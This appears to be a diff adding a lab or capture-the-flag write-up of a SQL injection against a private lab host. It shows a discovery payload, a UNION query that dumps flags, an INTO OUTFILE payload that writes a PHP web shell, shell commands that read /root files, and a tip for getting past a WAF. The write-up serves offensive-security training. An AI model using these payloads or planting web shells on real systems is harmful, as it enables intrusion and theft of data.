@@ -1,0 +1,66 @@
+🛠 SQL Injection Exploitation Summary ( Extra Mile)
+🧩 1. Vulnerable Endpoint
+bash
+Copy
+Edit
+http://192.168.239.101/extramile/index.php?id=
+🔍 2. SQLi Discovery Payload
+http
+Copy
+Edit
+?id=1 OR 1=1
+✅ Returned full list of notes — confirms classic numeric-based SQL injection with no input sanitization.
+
+📥 3. Flag Exfiltration via UNION Injection
+http
+Copy
+Edit
+?id=1 UNION SELECT 1,flag FROM flags--
+✅ Dumped content of the flags table directly to the second column in the UI.
+
+🐚 4. Web Shell Upload via INTO OUTFILE
+URL-encoded payload:
+
+http
+Copy
+Edit
+?id=1+UNION+SELECT+1,'<%3fphp+system($_GET["cmd"])%3b+%3f>'+INTO+OUTFILE+'/var/www/html/shell.php'--
+Decoded SQL:
+
+sql
+Copy
+Edit
+UNION SELECT 1, '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'
+✅ Result: PHP web shell created at:
+
+arduino
+Copy
+Edit
+http://192.168.239.101/extramile/shell.php
+🖥 5. Remote Command Execution
+Access the shell with:
+
+bash
+Copy
+Edit
+http://192.168.239.101/extramile/shell.php?cmd=whoami
+http://192.168.239.101/extramile/shell.php?cmd=ls /root
+http://192.168.239.101/extramile/shell.php?cmd=cat /root/flag.txt
+🧠 Notes & Gotchas
+The backend query likely looks like:
+
+php
+Copy
+Edit
+"SELECT * FROM notes WHERE id = $id;"
+(no quotes → numeric injection vector)
+
+App is vulnerable to:
+
+Boolean-based SQLi
+
+UNION-based SQLi
+
+INTO OUTFILE RCE
+
+WAF/400 response triggered on quote (') and keywords like AND unless URL-encoded.
